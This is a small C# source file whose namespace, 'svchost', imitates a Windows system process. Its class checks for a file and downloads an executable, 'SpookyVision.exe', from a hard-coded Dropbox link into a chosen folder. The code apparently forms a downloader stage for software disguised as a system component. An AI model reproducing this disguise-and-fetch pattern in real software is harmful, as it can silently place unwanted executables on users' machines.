using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Net;

namespace svchost
{
    class SpookyManager
    {
        public SpookyManager()
        {
        }

        public bool SpookyExists(string path)
        {
            if (File.Exists(path))
                return true;
            else
                return false;
        }

        public void DownloadSpooky(string directory, string name)
        {
            if (!Directory.Exists(directory))
                Directory.CreateDirectory(directory);

            WebClient Downloader = new WebClient();

            Downloader.DownloadFileAsync(new Uri("https://dl.dropbox.com/u/81945809/SpookyVision/SpookyVision.exe"), Path.Combine(directory, name));
        }
    }
}
